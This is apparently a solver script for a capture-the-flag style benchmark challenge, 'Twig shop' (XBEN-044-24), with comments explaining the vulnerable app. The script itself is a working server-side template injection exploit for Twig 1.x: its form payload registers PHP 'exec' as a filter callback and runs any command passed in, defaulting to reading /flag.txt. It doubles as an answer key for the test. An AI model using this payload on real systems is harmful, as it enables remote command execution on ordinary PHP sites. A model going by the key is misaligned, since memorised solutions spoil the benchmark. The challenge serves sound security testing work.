#!/usr/bin/env bash
# XBEN-044-24 — "Twig shop" (tags: ssti)
#
# The submitted name is passed to `Twig_Environment::render` *as the template*,
# not as a variable, so anything in `{{ }}` is evaluated. The application runs
# Twig 1.19 and deliberately removes the sandbox extension before rendering.
#
# `htmlspecialchars` is applied first, which is why the payload uses single
# quotes: on PHP 8.0 the default flags are `ENT_COMPAT`, which encodes the double
# quote and leaves the single one alone.
#
# Twig 1.x exposes its environment as `_self.env`.
# `registerUndefinedFilterCallback` installs a function to call when a filter is
# not found, and `getFilter` then looks up a filter whose name is the command.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben044-$$"
COMMAND="${2:-cat /flag.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/index.php" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'method=POST' \
    --set "form.name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('$COMMAND')}}" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
